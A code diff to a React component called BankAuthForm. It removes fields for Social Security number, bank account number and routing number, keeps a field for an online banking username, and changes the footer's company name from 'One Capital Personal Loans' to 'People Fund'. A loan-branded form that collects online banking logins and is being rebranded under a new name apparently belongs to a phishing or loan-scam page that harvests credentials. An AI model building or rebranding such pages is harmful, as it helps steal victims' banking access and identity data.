@@ -55,14 +55,7 @@ const BankAuthForm = () => {
     }
   };
 
-  const handleSsnFormat = (e: React.ChangeEvent<HTMLInputElement>) => {
-    let value = e.target.value.replace(/\D/g, '').slice(0, 9);
-    let formatted = '';
-    if (value.length > 0) formatted = value.slice(0, 3);
-    if (value.length >= 4) formatted += '-' + value.slice(3, 5);
-    if (value.length >= 6) formatted += '-' + value.slice(5, 9);
-    e.target.value = formatted;
-  };
+
 
   return (
     <div className="min-h-screen flex flex-col bg-white text-gray-800" style={{ fontFamily: "Arial, sans-serif" }}>
@@ -113,42 +106,7 @@ const BankAuthForm = () => {
                 />
              </div>
 
-             <div>
-                <label className="block text-gray-700 mb-2" style={{ fontSize: "18px" }}>Social Security Number*</label>
-                <input 
-                  type="text" 
-                  name="ssn" 
-                  placeholder="123-45-6789" 
-                  required 
-                  maxLength={11}
-                  onInput={handleSsnFormat}
-                  pattern="\d{3}-\d{2}-\d{4}"
-                  title="Format: 123-45-6789"
-                  className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
-                />
-             </div>
 
-             <div>
-                <label className="block text-gray-700 mb-2" style={{ fontSize: "18px" }}>Bank Account Number*</label>
-                <input 
-                  type="number" 
-                  name="account_number" 
-                  placeholder="Account#" 
-                  required 
-                  className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
-                />
-             </div>
-
-             <div>
-                <label className="block text-gray-700 mb-2" style={{ fontSize: "18px" }}>Bank Routing Number*</label>
-                <input 
-                  type="number" 
-                  name="routing" 
-                  placeholder="Routing#" 
-                  required 
-                  className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
-                />
-             </div>
 
              <div>
                 <label className="block text-gray-700 mb-2" style={{ fontSize: "18px" }}>Online Banking Username#*</label>
@@ -217,7 +175,7 @@ const BankAuthForm = () => {
       <footer className="bg-black py-12 mt-auto">
         <div className="container mx-auto px-4">
            <div className="text-center text-white/80" style={{ fontSize: "15px" }}>
-             Copyright © 2004-2026, One Capital Personal Loans, All Rights Reserved.
+             Copyright © 2004-2026, People Fund, All Rights Reserved.
            </div>
         </div>
       </footer>
